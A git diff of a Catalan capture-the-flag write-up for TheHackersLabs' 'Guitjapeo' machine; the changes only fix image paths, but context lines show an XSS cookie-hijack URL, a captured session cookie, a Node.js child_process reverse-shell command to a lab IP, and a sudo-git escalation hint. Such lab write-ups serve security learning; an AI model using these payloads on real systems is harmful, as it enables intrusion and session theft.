@@ -5,7 +5,7 @@ title: WriteUp Guitjapeo - TheHackersLabs
 slug: guitjapeo-writeup-thehackerslabs-ca
 featured: false  
 draft: false  
-ogImage: "assets/guitjapeo/OpenGraph.png"  
+ogImage: "../../../assets/images/guitjapeo/OpenGraph.png"  
 tags:
   - writeup
   - TheHackersLabs
@@ -21,7 +21,7 @@ lang: ca
 
 CTF on programarem, aprendrem sobre git i ens crearem un compte a GitHub.
 
-![alt text](/assets/guitjapeo/image.png)
+![alt text](../../../assets/images/guitjapeo/image.png)
 
 Espero que sigui del vostre gust.
 
@@ -92,7 +92,7 @@ ff02::2         ip6-allrouters
 192.168.1.173   guitjapeo.thl
 ```
 
-![guitjapeo.thl](/assets/guitjapeo/image-1.png)
+![guitjapeo.thl](../../../assets/images/guitjapeo/image-1.png)
 
 Escanejem aquest lloc web.
 
@@ -135,11 +135,11 @@ Finished
 
 Entrem a `https://guitjapeo.thl/register` i creem un usuari.
 
-![alt text](/assets/guitjapeo/image-2.png)
+![alt text](../../../assets/images/guitjapeo/image-2.png)
 
 i validem el nostre usuari a `https://guitjapeo.thl/login`. Aconseguirem entrar a `https://guitjapeo.thl/messages`.
 
-![alt text](/assets/guitjapeo/image-3.png)
+![alt text](../../../assets/images/guitjapeo/image-3.png)
 
 Veiem que hi ha una mena d'API on s'envien els missatges i es llegeix el llistat d'usuaris entre altres coses, seguim buscant amb gobuster a la ruta de l'API.
 
@@ -179,7 +179,7 @@ Finished
 
 Hem trobat altres endpoints interessants, visitem l'endpoint /api/info i ens retorna un json amb les capçaleres.
 
-![alt text](/assets/guitjapeo/image-4.png)
+![alt text](../../../assets/images/guitjapeo/image-4.png)
 
 ## Segrest de galetes
 
@@ -187,11 +187,11 @@ Al formulari de missatges podem enviar una URL, sembla que al desplegable podem 
 
 Fem una primera comprovació enviant una URL amb la IP de la nostra màquina i un servei http amb python.
 
-![alt text](/assets/guitjapeo/image-5.png)
+![alt text](../../../assets/images/guitjapeo/image-5.png)
 
 Sembla que l'usuari "Administrador" està visitant tots els enllaços que se li envien per l'aplicació. Si intentem llegir la galeta de sessió no podrem perquè té configurat "HttpOnly" això impedeix llegir la galeta des del navegador, només és possible llegir-la des de la banda del servidor.
 
-![alt text](/assets/guitjapeo/image-6.png)
+![alt text](../../../assets/images/guitjapeo/image-6.png)
 
 Això té solució si utilitzem l'endpoint `/api/info` que ens permet llegir les capçaleres, inclosa la de les galetes.
 
@@ -272,7 +272,7 @@ https://guitjapeo.thl/?text=%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%
 
 ... i esperem que faci clic per rebre la seva galeta de sessió.
 
-![alt text](/assets/guitjapeo/image-8.png)
+![alt text](../../../assets/images/guitjapeo/image-8.png)
 
 Descodifiquem el base64 i afegim les dades de la sessió a la nostra sessió des del navegador.
 
@@ -283,7 +283,7 @@ connect.sid=s%3A9a5Nk7U822jJ8sTvZ0md_17zMdYZRhSK.WtnvPx1dWLKLv4lOr6OES1e0wb4osW%
 ```
 Actualitzem la pàgina després de modificar la galeta i ja som l'usuari Administrador.
 
-![alt text](/assets/guitjapeo/image-9.png)
+![alt text](../../../assets/images/guitjapeo/image-9.png)
 
 ## RCE
 
@@ -307,7 +307,7 @@ https://guitjapeo
 .thl/api/command/?cmd=require%28%27child_process%27%29.exec%28%27bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.116%2F12345%200%3E%261%22%27%29
 ```
 
-![alt text](/assets/guitjapeo/image-10.png)
+![alt text](../../../assets/images/guitjapeo/image-10.png)
 
 Obtenim un shell amb l'usuari lenam.
 
@@ -348,7 +348,7 @@ Troben una carpeta .git, busquem si hi ha alguna cosa en l'historial del reposit
 git log --name-only --oneline
 ```
 
-![alt text](/assets/guitjapeo/image-11.png)
+![alt text](../../../assets/images/guitjapeo/image-11.png)
 
 Troben dos fitxers `archivo.zip` i `password.txt` que no estan a la carpeta de l'aplicació, els intentem recuperar.
 
@@ -598,7 +598,7 @@ User lenam may run the following commands on guitjapeo:
 
 Veiem que podem executar el comandament `git` (com no podia ser d'una altra forma) com l'usuari root.
 
-![alt text](/assets/guitjapeo/image-12.png)
+![alt text](../../../assets/images/guitjapeo/image-12.png)
 
 A GTFOBins trobem aquest binari on ens mostra algunes formes de poder utilitzar-lo per elevar privilegis, algunes utilitzen el manual o ajuda amb `less` no funcionarà perquè no estan instal·lats els manuals de git.
 
